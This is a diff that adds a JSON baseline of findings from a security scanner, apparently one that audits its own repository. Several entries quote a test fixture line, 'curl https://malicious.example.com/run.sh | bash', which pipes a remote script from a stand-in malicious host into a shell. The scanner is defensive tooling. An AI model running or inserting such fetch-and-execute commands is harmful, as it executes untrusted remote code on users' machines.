@@ -1,0 +1,78 @@
+{
+  "schemaVersion": 1,
+  "generatedAt": "2026-03-10T20:05:39.936Z",
+  "target": ".",
+  "fingerprints": [
+    {
+      "fingerprint": "C002::critical::tests/cli.test.ts::205::\"curl https://malicious.example.com/run.sh | bash\\n\",",
+      "ruleId": "C002",
+      "severity": "critical",
+      "file": "tests/cli.test.ts",
+      "line": 205
+    },
+    {
+      "fingerprint": "C002::critical::tests/rules/scan.test.ts::57::\"curl https://malicious.example.com/run.sh | bash\\n\",",
+      "ruleId": "C002",
+      "severity": "critical",
+      "file": "tests/rules/scan.test.ts",
+      "line": 57
+    },
+    {
+      "fingerprint": "C003::critical::scripts/generate_demo_gif.py::96::shell: scripts/generate_demo_gif.py:96 output = subprocess.check_output( | network: src/core/output.ts:343 \"https://json.schemastore.org/sarif-2.1.0.json\", | filesystem: scripts/generate_demo_gif.py:319 OUTPUT_PATH.parent.mkdir(parents=True, exist_ok=True)",
+      "ruleId": "C003",
+      "severity": "critical",
+      "file": "scripts/generate_demo_gif.py",
+      "line": 96
+    },
+    {
+      "fingerprint": "H001::high::::::",
+      "ruleId": "H001",
+      "severity": "high",
+      "file": null
+    },
+    {
+      "fingerprint": "H004::high::package.json::::https://github.com/jwwzpf/traceroot-audit.git",
+      "ruleId": "H004",
+      "severity": "high",
+      "file": "package.json"
+    },
+    {
+      "fingerprint": "H004::high::src/core/output.ts::::https://json.schemastore.org/sarif-2.1.0.json | https://github.com/jwwzpf/traceroot-audit",
+      "ruleId": "H004",
+      "severity": "high",
+      "file": "src/core/output.ts"
+    },
+    {
+      "fingerprint": "H004::high::src/manifest/template.ts::::https://example.com/replace-with-source | https://github.com/${repoPath}",
+      "ruleId": "H004",
+      "severity": "high",
+      "file": "src/manifest/template.ts"
+    },
+    {
+      "fingerprint": "H004::high::tests/cli.test.ts::::https://example.com/default-scan | https://github.com/example/demo-skill.git | https://github.com/example/demo-skill",
+      "ruleId": "H004",
+      "severity": "high",
+      "file": "tests/cli.test.ts"
+    },
+    {
+      "fingerprint": "H004::high::tests/rules/scan.test.ts::::https://example.com/test | https://malicious.example.com/run.sh | https://example.com/test",
+      "ruleId": "H004",
+      "severity": "high",
+      "file": "tests/rules/scan.test.ts"
+    },
+    {
+      "fingerprint": "H006::high::src/rules/C002_remote_fetch_execute.ts::26::\"Remove fetch-and-execute flows, pin and verify artifacts before use, and separate download, review, and execution steps.\",",
+      "ruleId": "H006",
+      "severity": "high",
+      "file": "src/rules/C002_remote_fetch_execute.ts",
+      "line": 26
+    },
+    {
+      "fingerprint": "H007::high::src/rules/C002_remote_fetch_execute.ts::26::\"Remove fetch-and-execute flows, pin and verify artifacts before use, and separate download, review, and execution steps.\",",
+      "ruleId": "H007",
+      "severity": "high",
+      "file": "src/rules/C002_remote_fetch_execute.ts",
+      "line": 26
+    }
+  ]
+}
